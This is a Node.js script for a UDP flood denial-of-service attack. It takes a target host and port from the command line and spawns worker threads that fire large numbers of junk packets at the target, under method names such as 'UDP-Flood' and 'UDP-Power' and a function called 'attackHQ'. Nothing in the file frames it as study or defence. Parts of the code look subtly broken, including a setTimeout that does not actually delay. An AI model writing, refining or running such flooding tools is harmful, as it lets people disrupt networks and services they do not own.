const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { Pool } = require('generic-pool');

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const method = process.argv[4];
const loops = parseInt(process.argv[5]) || 10000;
const delay = parseInt(process.argv[6]) || 1; // Delay in milliseconds between packets

// Function to send a packet
function sendPacket(amplifier) {
    const client = dgram.createSocket('udp4');

    const packet = Buffer.alloc(amplifier, '\x99');

    client.send(packet, 0, packet.length, port, host, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
        } else {
            console.log('Packet sent to', host, 'on port', port);
        }
        client.close();
    });
}

// Thread pool to manage sending packets
const pool = new Pool({
    create: () => {
        return new Worker(__filename, {
            workerData: { host, port, method, loops, delay }
        });
    },
    destroy: (worker) => {
        worker.terminate();
    }
});

if (isMainThread) {
    // Start the attack
    for (let i = 0; i < loops; i++) {
        pool.acquire().then((worker) => {
            worker.on('message', (result) => {
                console.log('Packet sent by worker:', result);
            });
            worker.on('error', (error) => {
                console.error('Worker error:', error);
            });
            worker.on('exit', (code) => {
                if (code !== 0) {
                    console.error(`Worker stopped with exit code ${code}`);
                }
                pool.release(worker);
            });
        });
    }
} else {
    // Worker code
    function attackHQ() {
        const amplifier = method === "UDP-Flood" ? 375 : method === "UDP-Power" ? 750 : 375;

        for (let i = 0; i < workerData.loops; i++) {
            sendPacket(amplifier);
            setTimeout(() => {}, workerData.delay);
        }
    }

    attackHQ();
}